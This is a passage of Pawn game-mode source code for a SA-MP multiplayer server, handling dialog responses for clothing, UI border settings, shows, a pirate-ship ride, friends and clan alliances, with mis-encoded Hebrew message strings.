						SetPlayerAttachedObject(playerid,aoslot_shavuot3,19345,5,0.0,0.05,0.0,0.0,0.0,0.0,0.3,0.3,0.3);
						playerinfo[playerid][shavuot] = 2;
						GiveMoney(playerid,0-5, 17);
					}
				}
				case 2: // firetruck
				{
					if(GetMoney(playerid) < 10) SendClientMessage(playerid,red," !рщя ьъ юёЇщў ыёє");
					else
					{
						new r = random(sizeof(Kickstar)), newv = CreateVehicleEx(407,Kickstar[r][0],Kickstar[r][1],Kickstar[r][2],0.0,-1,-1,respawntime,0,worlds_dmz + dmz_shavuot);
						playerinfo[playerid][vtemp] = newv;
						PutPlayerInVehicle(playerid,newv,0);
						SetVehicleHealth(newv,3000.0);
						GameTextForPlayer(playerid,"~r~firetruck!",2000,5);
						GiveMoney(playerid,0-10, 17);
					}
				}
			}
			SetFreeze(playerid,0);
		}
		case dialog_clothesmenu: if(response)
		{
			playerinfo[playerid][clothesclick][0] = listitem;
			switch(listitem)
			{
				case 0, 1: // ЄщЎхс
				{
					new content[256], header[64];
					for(new i = 0; i < sizeof(ClothesCategories); i++) format(content,sizeof(content),!strlen(content) ? ("%s%s") : ("%s\n%s"),content,ClothesCategories[i]);
					format(header,sizeof(header),@c(lightblue) ":сч° ўштх°щщ· ьсх∙ Єсх° ЄщЎхс " @c(white) "#%d",listitem + 1);
					ShowPlayerDialog(playerid,dialog_clothes,DIALOG_STYLE_LIST,header,content,"счщ°ф","чц°ф");
				}
				case 2: // Ёщўхщ ЄщЎхс
				{
					if(playerinfo[playerid][clothes] == -1 && playerinfo[playerid][clothes2] == -1) ShowPlayerDialog(playerid,dialog_clothesmsg,DIALOG_STYLE_MSGBOX,@c(lightblue) "Ёщўхщ ЄщЎхс",@c(red) " .рщя ьъ ∙хэ ЄщЎхс ьуюх·","чц°ф","щЎщрф");
					else ShowPlayerDialog(playerid,dialog_clothes,DIALOG_STYLE_MSGBOX,@c(lightblue) "Ёщўхщ ЄщЎхс",@c(grey) " ?фрэ с°ЎхЁъ ьЁўх· р· фЄщЎхс ∙ь фуюх· ∙ьъ","ыя","ьр");
				}
				case 3: // уюх· Ёхычщ·
				{
					ShowPlayerDialog(playerid,dialog_clothes,DIALOG_STYLE_INPUT,@c(lightblue) "∙щЁхщ уюх·",@c(green) " :Ёр ьфўьщу ыря р· юёЇ° фуюх· ∙с°ЎхЁъ ь∙Ёх· рьщф","∙щЁхщ","чц°ф");
				}
				case 4: // чц°ф ьуюх· ∙юх°ф
				{
					if(playerinfo[playerid][skin] == -1) ShowPlayerDialog(playerid,dialog_clothesmsg,DIALOG_STYLE_MSGBOX,@c(lightblue) "Ёщўхщ ЄщЎхс",@c(red) " .рщя ьъ уюх· ∙юх°ф","чц°ф","щЎщрф");
					else if(GetPlayerSkin(playerid) == playerinfo[playerid][skin]) ShowPlayerDialog(playerid,dialog_clothesmsg,DIALOG_STYLE_MSGBOX,@c(lightblue) "Ёщўхщ ЄщЎхс",@c(red) " .фуюх· ∙щ∙ ьъ ы°тЄ фщр фуюх· ф∙юх°ф ∙ьъ","чц°ф","щЎщрф");
					else
					{
						SetPlayerSkin(playerid,playerinfo[playerid][skin]);
						ShowPlayerDialog(playerid,dialog_clothesmsg,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щЁхщ уюх·",@c(green) " .фуюх· ∙ьъ фхчц°ф ьуюх· ф∙юх°ф","чц°ф","щЎщрф");
					}
				}
			}
		}
		case dialog_clothes:
		{
			if(response)
			{
				switch(playerinfo[playerid][clothesclick][0])
				{
					case 0, 1: // ЄщЎхс
					{
						playerinfo[playerid][clothesclick][1] = listitem;
						new content[400], header[64];
						for(new i = 0; i < sizeof(Clothes); i++) if(Clothes[i][cltCategory] == listitem) format(content,sizeof(content),!strlen(content) ? ("%s%s") : ("%s\n%s"),content,Clothes[i][cltName]);
						format(header,sizeof(header),@c(lightblue) ":сч° ёхт ьсх∙ Єсх° ЄщЎхс " @c(white) "#%d",playerinfo[playerid][clothesclick][0] + 1);
						ShowPlayerDialog(playerid,dialog_clothes2,DIALOG_STYLE_LIST,header,content,"счщ°ф","чц°ф");
					}
					case 2: // Ёщўхщ ЄщЎхс
					{
						new start = aoslot_clothes, end = aoslot_clothes2;
						while(start != end + 1)
						{
							RemovePlayerAttachedObject(playerid,start);
							start++;
						}
						if(playerinfo[playerid][clothes] > -1)
						{
							playerinfo[playerid][clothes] = -1;
							for(new i = 0; i < 6; i++) playerinfo[playerid][clothesp][i] = 0.0;
							if(playerinfo[playerid][logged])
							{
								fremovekey(fuser(playerid),"ClothesID");
								fremovekey(fuser(playerid),"ClothesX");
								fremovekey(fuser(playerid),"ClothesY");
								fremovekey(fuser(playerid),"ClothesZ");
								fremovekey(fuser(playerid),"ClothesRX");
								fremovekey(fuser(playerid),"ClothesRX");
								fremovekey(fuser(playerid),"ClothesRX");
							}
						}
						if(playerinfo[playerid][clothes2] > -1)
						{
							playerinfo[playerid][clothes2] = -1;
							for(new i = 0; i < 6; i++) playerinfo[playerid][clothes2p][i] = 0.0;
							if(playerinfo[playerid][logged])
							{
								fremovekey(fuser(playerid),"Clothes2ID");
								fremovekey(fuser(playerid),"Clothes2X");
								fremovekey(fuser(playerid),"Clothes2Y");
								fremovekey(fuser(playerid),"Clothes2Z");
								fremovekey(fuser(playerid),"Clothes2RX");
								fremovekey(fuser(playerid),"Clothes2RX");
								fremovekey(fuser(playerid),"Clothes2RX");
							}
						}
						playerinfo[playerid][clothescost] = {0,0};
						ShowPlayerDialog(playerid,dialog_clothesmsg,DIALOG_STYLE_MSGBOX,@c(lightblue) "Ёщўхщ ЄщЎхс",@c(green) ".фЄщЎхс Ёхўф сфЎьчф","чц°ф","щЎщрф");
					}
					case 3: // уюх· Ёхычщ·
					{
						if(strlen(inputtext) > 0 && IsNumeric(inputtext) && IsValidSkin(strval(inputtext)))
						{
							if(strval(inputtext) == GetPlayerSkin(playerid)) ShowPlayerDialog(playerid,dialog_clothesmsg,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щЁхщ уюх·",@c(red) " .ыс° щ∙ ьъ р· фуюх· ∙фыЁё·","чц°ф","щЎщрф");
							else
							{
								SetPlayerSkin(playerid,strval(inputtext));
								ShowPlayerDialog(playerid,dialog_clothesmsg,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щЁхщ уюх·",@c(green) " .фуюх· ∙хЁ·ф сфЎьчф","чц°ф","щЎщрф");
							}
						}
						else ShowPlayerDialog(playerid,dialog_clothesmsg,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щЁхщ уюх·",@c(red) " .фыЁё· уюх· ∙тхщф","чц°ф","щЎщрф");
					}
				}
			}
			else command(playerid,"/clothes");
		}
		case dialog_clothes2:
		{
			if(response) switch(playerinfo[playerid][clothesclick][0])
			{
				case 0, 1: // ЄщЎхс
				{
					new c = 0, id = -1;
					for(new i = 0; i < sizeof(Clothes) && id == -1; i++) if(Clothes[i][cltCategory] == playerinfo[playerid][clothesclick][1])
					{
						if(c == listitem) id = i;
						c++;
					}
					if(id != -1)
					{
						format(string,sizeof(string)," :Єьщъ ьЄЎс ыЄ· р· фьсх∙ " @c(lightpurple) "%s",Clothes[id][cltName]);
						SendClientMessage(playerid,lightblue,string);
						SendClientMessage(playerid,yellow," + .ф∙·ю∙ сыЇ·х° " @c(lightyellow) "р°сЄф чЎщэ" @c(yellow) " ыущ ьЄ°хъ р· ющўхэ фьсх∙");
						SendClientMessage(playerid,yellow," + .ф∙·ю∙ сыЇ·х° " @c(lightyellow) "чї юЄхть" @c(yellow) " ыущ ьёхсс р· фьсх∙");
						SendClientMessage(playerid,yellow," + .Ёр ьр ьф∙·ю∙ сыЇ·х° " @c(lightyellow) "∙Ёщ ю°хсЄщэ");
						SendClientMessage(playerid,green," + .(ыущ ь∙Ёх· р· фрхсщщўш сю°чс (ьёхсс рх ьфцщц ьЇщ юф ∙сч°· " @c(lightyellow) "X,Y,Z" @c(green) " рч°щ ∙сч°· рэ ьфцщц рх ьёхсс, ф∙·ю∙ сыЇ·х°щэ");
						SendClientMessage(playerid,orange," + .ыущ ьЎЇх· суюх· юыщххя рч° " @c(yellow) "~k~~PED_SPRINT~" @c(orange) " ьчї");
						SendClientMessage(playerid,orange," + .ьчї " @c(yellow) "рёўщщЇ" @c(orange) " ыущ ьсшь р· фЄ°щыф рх Єь ыЇ·х° " @c(yellow) "ущёўш" @c(orange) " ыущ ь∙юх°");
						if(playerinfo[playerid][clothesclick][0] == 0)
						{
							SetPlayerAttachedObject(playerid,aoslot_clothes,Clothes[id][cltModel],Clothes[id][cltBone],playerinfo[playerid][clothesp][0],playerinfo[playerid][clothesp][1],playerinfo[playerid][clothesp][2],playerinfo[playerid][clothesp][3],playerinfo[playerid][clothesp][4],playerinfo[playerid][clothesp][5]);
							EditAttachedObject(playerid,aoslot_clothes);
							playerinfo[playerid][clothescost][0] = Clothes[id][cltCost];
						}
						else
						{
							SetPlayerAttachedObject(playerid,aoslot_clothes2,Clothes[id][cltModel],Clothes[id][cltBone],playerinfo[playerid][clothes2p][0],playerinfo[playerid][clothes2p][1],playerinfo[playerid][clothes2p][2],playerinfo[playerid][clothes2p][3],playerinfo[playerid][clothes2p][4],playerinfo[playerid][clothes2p][5]);
							EditAttachedObject(playerid,aoslot_clothes2);
							playerinfo[playerid][clothescost][1] = Clothes[id][cltCost];
						}
						playerinfo[playerid][clothesclick][2] = id, playerinfo[playerid][editing] = edit_attached_clothes;
					}
				}
			}
			else OnDialogResponse(playerid,dialog_clothesmenu,1,playerinfo[playerid][clothesclick][0],"");
		}
		case dialog_clothesmsg: if(response) command(playerid,"/clothes");
		case dialog_getsetting: if(response)
		{
			new content[400];
			playerinfo[playerid][clickon] = listitem;
			for(new i = GetSettingItemsCount(-1,listitem), m = GetSettingItemsCount(1,listitem); i < m; i++) format(content,sizeof(content),!i ? ("%s%s") : ("%s\n%s"),content,GetSettingName(playerid,listitem,i));
			ShowPlayerDialog(playerid,dialog_getsetting2,DIALOG_STYLE_LIST,@c(lightblue) "сч° Ї°щш юф°∙щюф ь∙щЁхщ",content,"счщ°ф","сщшхь");
		}
		case dialog_getsetting2:
		{
			if(response)
			{
				playerinfo[playerid][getsetting][playerinfo[playerid][clickon]] = listitem;
				PlaySound(playerid,1057);
			}
			ShowPlayerConstDialog(playerid,dialog_getsetting);
		}
		case dialog_kick: if(response)
		{
			format(string,sizeof(string),"/kick %d %s",playerinfo[playerid][punishdia],inputtext);
			command(playerid,string);
		}
		case dialog_ban: if(response)
		{
			format(string,sizeof(string),"/ban %d %s",playerinfo[playerid][punishdia],inputtext);
			command(playerid,string);
		}
		case dialog_showlist: if(response)
		{
			new c = 0, itsID = -1;
			for(new i = 0; i < MAX_SHOWS && itsID == -1; i++) if(showinfo[i][shwValid])
			{
				if(c == listitem) itsID = i;
				c++;
			}
			if(itsID != -1) SendShowInfo(playerid,itsID,dialog_showinfo);
		}
		case dialog_showinfo: if(response) command(playerid,"/show list");
		case dialog_show: if(response)
		{
			if(currentShow[0] == -1) return ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "фЎш°Їх· ьфхЇЄф",@c(red) ".рщя фхЇЄф ы°тЄ","ётх°","");
			if(GetPlayerVirtualWorld(playerid) == world_show) ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "фЎш°Їх· ьфхЇЄф",@c(red) ".р·ф ыс° сфхЇЄф","ётх°","");
			if(GetMoney(playerid) < showinfo[currentShow[0]][shwCost]) return ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "фЎш°Їх· ьфхЇЄф",@c(red) ".рщя ьъ ыёє ьўЁщщ· ы°шщё","ётх°","");
			if(!CanUseCommand(playerid)) return 1;
			GiveMoney(playerid,0-showinfo[currentShow[0]][shwCost]);
			SetPlayerVirtualWorld(playerid,world_show);
			SetPlayerInterior(playerid,0);
			SetPlayerHealth(playerid,100.0);
			SetPlayerArmour(playerid,0.0);
			SetPlayerPos(playerid,576.4498+floatrand(-5.0,5.0),-1868.2633+floatrand(-5.0,5.0),4.3897);
			SetPlayerFacingAngle(playerid,0.0);
			SetCameraBehindPlayer(playerid);
			ResetWeapons(playerid);
			format(string,sizeof(string),@c(green) "!%s ∙ь %s ўЁщ· ы°шщё ьфхЇЄф",showinfo[currentShow[0]][shwSinger],showinfo[currentShow[0]][shwName]);
			if(currentShow[1] == -1) format(string,sizeof(string),"%s\n.ффхЇЄф Єущщя ьр ф·чщьф, рЁр фю·я Єу юўёщюхэ уўф хчЎщ",string);
			ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "ыЁщёф ьфхЇЄф",string,"OK","");
		}
		case dialog_border_me: if(response) ShowPlayerDialog(playerid,dialog_border_me2,DIALOG_STYLE_LIST,@c(lightblue) "фю∙·ю∙ ∙ьъ - рЇ∙°хщх·",@c(green) "∙щЁхщ ыщЁхщ\n" @c(yellow) "∙щЁхщ ёщёюр\n" @c(red) "ёшршё\n" @c(purple) "Ї°хЇщь","счщ°ф","чц°ф");
		case dialog_border_me2:
		{
			if(response)
			{
				switch(listitem)
				{
					case 0: command(playerid,"/changename");
					case 1: command(playerid,"/changepass");
					case 2: command(playerid,"/stats");
					case 3: command(playerid,"/profile");
					case 4: if(IsPlayerMAdmin(playerid))
					{
						playerinfo[playerid][range] = 0.0, playerinfo[playerid][attype] = at_player;
						ShowPlayerConstDialog(playerid,dialog_admintotal);
						playerinfo[playerid][clickon] = playerid;
					}
				}
			}
			else ShowPlayerConstDialog(playerid,dialog_border_me);
		}
		case dialog_border_bank: if(response) command(playerid,"/bank");
		case dialog_border_friends: if(response)
		{
			new list[MAX_FRIENDS], c = 0;
			list = GetFriends(playerid,c);
			if(c > 0 && listitem < c)
			{
				playerinfo[playerid][clickon] = list[listitem];
				format(string,sizeof(string),@c(lightblue) ":%s-∙ьч фхуЄф Ї°шщ· ь",GetName(list[listitem]));
				ShowPlayerDialog(playerid,dialog_border_pmfriend,DIALOG_STYLE_INPUT,string,@c(yellow) ":фўьу ыря р· ·хыя ффхуЄф","∙ьч","чцх°");
			}
		}
		case dialog_border_pmfriend:
		{
			if(response)
			{
				format(string,sizeof(string),"/pm %d %s",playerinfo[playerid][clickon],inputtext);
				command(playerid,string);
			}
			else
			{
				new list[MAX_FRIENDS], c = 0;
				list = GetFriends(playerid,c);
				if(c > 0)
				{
					for(new i = 0; i < c; i++) format(string,sizeof(string),!strlen(string) ? ("%s%d) %s - ID %03d") : ("%s\n%d) %s - ID %03d"),string,i+1,GetName(list[i]),list[i]);
					ShowPlayerDialog(playerid,dialog_border_friends,DIALOG_STYLE_LIST,@c(lightblue) "чс°щэ ючхс°щэ",string,"PM","ётх°");
				}
			}
		}
		case dialog_border_setting: if(response)
		{
			switch(listitem)
			{
				case 0:
				{
					if(playerinfo[playerid][bordervis])
					{
						Border(playerid,"hide");
						playerinfo[playerid][bordershow] = 0;
						if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"Border",0);
						ShowPlayerDialog(playerid,dialog_border_settingmsg,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙х°· фющуЄ",@c(grey) "/Border ф∙х°ф фхё·°ф, ыущ ьфчцщ° рх·ф ф∙·ю∙ ∙хс сЇўхуф","чцх°","ётх°");
					}
					else
					{
						Border(playerid,"show");
						playerinfo[playerid][bordershow] = 1;
						if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"Border",1);
						ShowPlayerDialog(playerid,dialog_border_settingmsg,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙х°· фющуЄ",@c(grey) ".ф∙х°ф фхЎтф","чцх°","ётх°");
					}
				}
				case 1: ShowPlayerDialog(playerid,dialog_border_color,DIALOG_STYLE_LIST,@c(lightblue) "∙щЁхщ ЎсЄ ь∙х°· фющуЄ",@c(white) "∙чх° - °тщь\n" @c(white) "ься\n" @c(red) "рухэ\n" @c(green) "щ°хў\n" @c(blue) "ычхь\n" @c(orange) "ы·хэ\n" @c(purple) "ётхь\n" @c(pink) "х°ху\n" @c(grey) "рЇх°","∙Ёф","чцх°");
				case 2: ShowPlayerDialog(playerid,dialog_border_alpha,DIALOG_STYLE_LIST,@c(lightblue) "∙щЁхщ ∙ўщЇх· ь∙х°· фющуЄ","∙ўщЇх· °юф 1\n∙ўщЇх· °юф 2 - °тщь\n∙ўщЇх· °юф 3\n∙х°ф ∙ўхЇф","∙Ёф","чцх°");
			}
		}
		case dialog_border_color:
		{
			if(response)
			{
				if(!playerinfo[playerid][bordervis]) ShowPlayerDialog(playerid,dialog_border_settingmsg,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙х°· фющуЄ",@c(red) ".ф∙х°ф рщЁф юхЎт·, ьыя ьр Ёщ·я ь∙Ёх· ЎсЄ","чцх°","ётх°");
				else
				{
					new col = black;
					switch(listitem)
					{
						case 0: col = black;
						case 1: col = white;
						case 2: col = red;
						case 3: col = green;
						case 4: col = blue;
						case 5: col = orange;
						case 6: col = purple;
						case 7: col = pink;
						case 8: col = grey;
					}
					playerinfo[playerid][borderrgb][0] = getRed(col), playerinfo[playerid][borderrgb][1] = getGreen(col), playerinfo[playerid][borderrgb][2] = getBlue(col);
					Border(playerid,"color");
					if(playerinfo[playerid][logged])
					{
						fsetint(fuser(playerid),"BorderR",playerinfo[playerid][borderrgb][0]);
						fsetint(fuser(playerid),"BorderG",playerinfo[playerid][borderrgb][1]);
						fsetint(fuser(playerid),"BorderB",playerinfo[playerid][borderrgb][2]);
					}
				}
			}
			ShowPlayerConstDialog(playerid,dialog_border_setting);
		}
		case dialog_border_alpha:
		{
			if(response)
			{
				if(!playerinfo[playerid][bordervis]) ShowPlayerDialog(playerid,dialog_border_settingmsg,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙х°· фющуЄ",@c(red) ".ф∙х°ф рщЁф юхЎт·, ьыя ьр Ёщ·я ь∙Ёх· ∙ўщЇх·","чцх°","ётх°");
				else
				{
					playerinfo[playerid][borderalpha] = listitem == 3 ? 0 : listitem;
					Border(playerid,"color");
					if(playerinfo[playerid][logged]) fsetint(fuser(playerid),"BorderAlpha",playerinfo[playerid][borderalpha]);
				}
			}
			ShowPlayerConstDialog(playerid,dialog_border_setting);
		}
		case dialog_border_settingmsg: if(response) ShowPlayerConstDialog(playerid,dialog_border_setting);
		case dialog_sail: if(response)
		{
			if(!CanUseCommand(playerid)) return 1;
			if(GetPlayerVirtualWorld(playerid) != world_normal || GetPlayerInterior(playerid) != 0 || !IsPlayerInRangeOfPoint(playerid,30.0,2001.14,1555.10,24.88)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· ў°хс ьёЇщЁ· фыёє");
			if(pirateUser[0] != INVALID_PLAYER_ID)
			{
				if(pirateUser[0] == playerid) format(string,sizeof(string)," ~k~~VEHICLE_ENTER_EXIT~ р·ф ы°тЄ ю∙·ю∙ сёЇщЁ· фыёє хЁ∙р°х ьъ %d ∙Ёщх·. рэ р·ф юЄхЁщщя ьЎр·, ьчї",pirateUser[1]);
				else format(string,sizeof(string)," .ю∙·ю∙ сёЇщЁ· фыёє хЁ∙р°х ьх %d ∙Ёщх· ьёщхэ %s ы°тЄ",pirateUser[1],GetName(pirateUser[0]));
				return SendClientMessage(playerid,red,string);
			}
			if(GetMoney(playerid) < 200) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє, ∙щщш Єхьф 200$ ьуўф хчЎщ");
			GiveMoney(playerid,0-200);
			if(IsValidSObject(pirateshipobj)) DestroySObject(pirateshipobj);
			pirateUser[0] = playerid, pirateUser[1] = 90;
			SetVehicleVirtualWorld(pirateVehicle,world_normal);
			//AttachDynamicAreaToPlayer(MoneyAreas[0][maAreaID],playerid);
			//for(new i = 0; i < pirateObjects; i++) AttachDynamicObjectToObject(pirateObject[i],pirateObject[0],pirateObjectPos[i][0] - pirateObjectPos[0][0],pirateObjectPos[i][1] - pirateObjectPos[0][1],pirateObjectPos[i][2] - pirateObjectPos[0][2],pirateObjectPos[i][3],pirateObjectPos[i][4],pirateObjectPos[i][5]);
			PutPlayerInVehicle(playerid,pirateVehicle,0);
			RepairVehicle(pirateVehicle);
			SetVehiclePos(pirateVehicle,1953.1755,1513.2629,35.3312);
			SetVehicleZAngle(pirateVehicle,174.4417);
			format(string,sizeof(string)," !∙ш ыЄ· сёЇщЁ· фыёє %s",GetName(playerid));
			News(string);
			ShowPlayerDialog(playerid,dialog_ni,DIALOG_STYLE_MSGBOX,@c(lightblue) "∙щщш сёЇщЁ· фыёє",@c(lightblue) ".цюя ф∙щщш ∙ьъ ф·чщь Єы∙щх! сЄху уўф хчЎщ ·Ўш°ъ ьёщщэ\n\n" @c(white) ".·хыь ь∙хш сёЇщЁф сущхў ыюх с∙щщш сёщ°ф\n(~k~~VEHICLE_ENTER_EXIT~) ьчї Єь юў∙ фщЎщрф ю°ыс ыущ ьёщщэ р· ф∙щщш\n(~k~~VEHICLE_FIREWEAPON~) ьчї Єь юў∙ фф·ўЇф ь∙ьщч· шх°Їух","OK","");
		}
		case dialog_showstats:
		{
			if(playerinfo[playerid][showstats] != INVALID_PLAYER_ID)
			{
				UpdateStatsFields(playerid,"hide");
				playerinfo[playerid][showstats] = INVALID_PLAYER_ID;
			}
		}
		case dialog_secretword:
		{
			if(!strlen(inputtext)) ShowPlayerConstDialog(playerid,dialog_secretword,3);
			else if(strlen(inputtext) < 4 || strlen(inputtext) > 30) ShowPlayerConstDialog(playerid,dialog_secretword,4);
			else
			{
				SendClientMessage(playerid,green," !фющьф фёхущ· ∙ьъ Ё∙ю°ф сфЎьчф, ·∙юх° Єьщф срхЇя сшхч ыщ фщр юф ∙ютя Єь фю∙·ю∙ ∙ьъ");
				PlaySound(playerid,1057);
				playerinfo[playerid][security] = 1;
				format(playerinfo[playerid][secretword],MAX_SECURITY_WORD_LENGTH,inputtext);
				fsetstring(fuser(playerid),"SecretWord",inputtext);
			}
		}
		case dialog_takereport: if(response)
		{
			format(string,sizeof(string),"/takereport %d",playerinfo[playerid][iadminot][2]);
			command(playerid,string);
			playerinfo[playerid][iadminot][0] = 0;
			playerinfo[playerid][iadminot][2] = -1;
		}
		case dialog_clan:
		{
			if(playerinfo[playerid][clan] == 0 || !claninfo[playerinfo[playerid][clan]][cvalid] || !playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .сЄщф юёхщщю· чьф хьр юрЇ∙°· ьфю∙щъ ьЄсху Єэ ф·Ї°щш фцф");
			new f[64];
			format(f,sizeof(f),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
			#define securedSelect(%1) if(!equal(fgetstring(%1,"ClanCode"),clancode(playerinfo[playerid][clan]))) return SendClientMessage(playerid,red," .сЄщф юёхщщю· чьф хьр юрЇ∙°· ьфю∙щъ ьЄсху Єэ ф·Ї°щш фцф")
			if(response)
			{
				switch(playerinfo[playerid][cclick][0])
				{
					case clan_main:
					{
						switch(listitem)
						{
							case 0: ClanDialog(playerid,clan_fullinfo);
							case 1: ClanDialog(playerid,clan_allmembers);
							case 2: ClanDialog(playerid,clan_onlinemembers);
							case 3: ClanDialog(playerid,clan_edit);
							case 4: ClanDialog(playerid,clan_manage);
							case 5: ClanDialog(playerid,clan_systems);
							case 6: ClanDialog(playerid,clan_chat);
							case 7: ClanDialog(playerid,clan_powers);
							case 8: ClanDialog(playerid,clan_cameras);
							case 9:
							{
								SendClientMessage(playerid, red, " .рЇ∙°х· цх ·чцх° сфю∙ъ");
								ClanDialog(playerid,clan_main);
								//ClanDialog(playerid,clan_store);
							}
							case 10: ClanDialog(playerid,clan_alliances);
							case 11: ClanDialog(playerid,clan_other);
							case 12: ClanDialog(playerid,clan_quit);
							//case 13: ClanDialog(playerid,clan_tutorial);
							case 13: SendClientMessage(playerid, white, "/mode 32 | /mode 33 :Єц°ф сюЄ°ы· фўьрЁщэ");
							default: return 1;
						}
					}
					case clan_fullinfo:
					{
					    ClanDialog(playerid,clan_fullinfo);
						/*new cid = -1;
						if(strlen(inputtext) > 0 && (cid = clannumber(inputtext)) > 0)
						{
							if(claninfo[cid][cvalid]) ShowClanStats(playerid,cid,dialog_clan);
						}
						else ClanDialog(playerid,clan_err,".∙э фўьря ∙фўьу· рщЁх ·ўщя");*/
					}
					case clan_allmembers:
					{
						switch(listitem)
						{
							case 0:
							{
								if(!HasClanPermission(playerid,clanperm_invite)) return 1;
								if(ClanPList_Count(playerinfo[playerid][clan]) >= max_clan_members) return ClanDialog(playerid,clan_err,".ьр Ёщ·я ьфхёщє Єху ∙чўЁщэ ьўьря юыщххя ∙фхр юьр");
								ClanDialog(playerid,clan_addmember);
							}
							case 1:
							{
								format(string,sizeof(string),"ыюх· ∙чўЁщэ ёъ фыь: %d",ClanPList_Count(playerinfo[playerid][clan]));
								format(string,sizeof(string),"%s\nютсь· ∙чўЁщэ: %d",string,max_clan_members);
								ClanDialog(playerid,clan_not,string);
							}
							case 2:
							{
								if(!HasClanPermission(playerid,clanperm_invite)) return 1;
								ClanPList_Reorder(playerinfo[playerid][clan]);
								ClanDialog(playerid,clan_not,".схЎЄ ёщух° ючу∙ ь°∙щю· чс°щ фўьря");
							}
							default:
							{
								if(strfind(inputtext,"ЇЁхщ") != -1) ClanDialog(playerid,clan_allmembers);
								else
								{
									new c = 0, ind = -1;
									for(new i = 1; i <= max_clan_members && ind == -1; i++)
									{
										format(string,sizeof(string),ClanPList_Player(playerinfo[playerid][clan],i));
										if(!equal(string,"None"))
										{
											if(c == listitem-3) ind = i;
											c++;
										}
									}
									if(ind != -1) ClanDialog(playerid,clan_viewmember,ClanPList_Player(playerinfo[playerid][clan],ind),clan_allmembers);
								}
							}
						}
					}
					case clan_alliances: if(response)
					{
						if(playerinfo[playerid][clan] == 0 || !claninfo[playerinfo[playerid][clan]][cvalid]) return SendClientMessage(playerid,red," .р·ф ьр сўьря °∙ющ");
						if(!HasClanPermission(playerid,clanperm_peace)) return 1;
						switch(listitem)
						{
							case 0: ClanDialog(playerid, clan_alliances_invite);
							case 1: ClanDialog(playerid, clan_alliances_remove);
							case 2: // рщ∙х° сў∙ф
							{
							    new clanid = -1;
							    for(new x; x < MAX_CLANS; x++) if(claninfo[x][cvalid] && claninfo[x][cask][playerinfo[playerid][clan]]) clanid = x;
								if(clanid == -1) return ClanDialog(playerid, clan_alliances), SendClientMessage(playerid, red, " .рє ўьря ьр фцющя р· фўьря ∙ьъ ьфёыэ с°щ·");
								if(playerinfo[playerid][clan] == clanid) return ClanDialog(playerid, clan_alliances), SendClientMessage(playerid,red," .рщя рЇ∙°х· ьсЎЄ р· фЇЄхьф фцх Єэ фўьря ∙ьъ");
								if(!claninfo[clanid][cask][playerinfo[playerid][clan]]) return ClanDialog(playerid, clan_alliances), SendClientMessage(playerid,red," .фўьря фцф ьр сщў∙ ∙ьхэ Єэ фўьря ∙ьъ");
								claninfo[clanid][cpeace][playerinfo[playerid][clan]] = true,
								claninfo[clanid][cask][playerinfo[playerid][clan]] = false,
								claninfo[playerinfo[playerid][clan]][cpeace][clanid] = true,
								claninfo[playerinfo[playerid][clan]][cask][clanid] = false;
								format(f,sizeof(f),"/DM/Clans/%s.ini",claninfo[playerinfo[playerid][clan]][cname]);
								for(new i=0;i<MAX_CLANS;i++)
								{
									format(string,sizeof(string),"Peace%d",i);
									if(fkeyexist(f,string)) continue;
									fsetstring(f,string,claninfo[clanid][cname]);
									break;
								}
								format(f,sizeof(f),"/DM/Clans/%s.ini",claninfo[clanid][cname]);
								for(new i=0;i<MAX_CLANS;i++)
								{
									format(string,sizeof(string),"Peace%d",i);
									if(fkeyexist(f,string)) continue;
									fsetstring(f,string,claninfo[playerinfo[playerid][clan]][cname]);
									break;
								}
								format(string,sizeof(string)," !%s х %s фхёыэ ∙ьхэ сщя фўьрЁщэ",claninfo[playerinfo[playerid][clan]][cname],claninfo[clanid][cname]);
								SendClientMessageToAll(MixColors(claninfo[playerinfo[playerid][clan]][ccolor][0],claninfo[playerinfo[playerid][clan]][ccolor][1],claninfo[playerinfo[playerid][clan]][ccolor][2],claninfo[clanid][ccolor][0],claninfo[clanid][ccolor][1],claninfo[clanid][ccolor][2]),string);
								for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i) && (playerinfo[i][clan] == clanid || playerinfo[i][clan] == playerinfo[playerid][clan]))
								{
									SendClientMessage(i,lightblue," :Єы∙щх ы∙р·э с∙ьхэ, щ∙ ьыэ юёЇ° рЇ∙°хщх· чу∙х·");
									format(string,sizeof(string)," * /phq %s - ф∙·т°х· ьюЇўу· фўьря ∙с∙ьхэ Єэ фўьря ∙ьъ",claninfo[playerinfo[i][clan] == clanid ? playerinfo[playerid][clan] : clanid][cname]);
									SendClientMessage(i,orange,string);
									format(string,sizeof(string)," * /og + /cg - %s Ї·щч· хётщ°· рхсщщўшщэ ∙хЁщэ сюЇўуф ∙ь",claninfo[playerinfo[i][clan] == clanid ? playerinfo[playerid][clan] : clanid][cname]);
									SendClientMessage(i,orange,string);
									format(string,sizeof(string)," * $ %s [text] - %s ∙ьщч· фхуЄф ьўьря",claninfo[playerinfo[i][clan] == clanid ? playerinfo[playerid][clan] : clanid][cname],claninfo[playerinfo[i][clan] == clanid ? playerinfo[playerid][clan] : clanid][cname]);
									SendClientMessage(i,orange,string);
								}
							}
							case 3: // ёщ°хс сў∙ф
							{
								new clanid = -1;
							    for(new x; x < MAX_CLANS; x++) if(claninfo[x][cvalid] && claninfo[x][cask][playerinfo[playerid][clan]]) clanid = x;
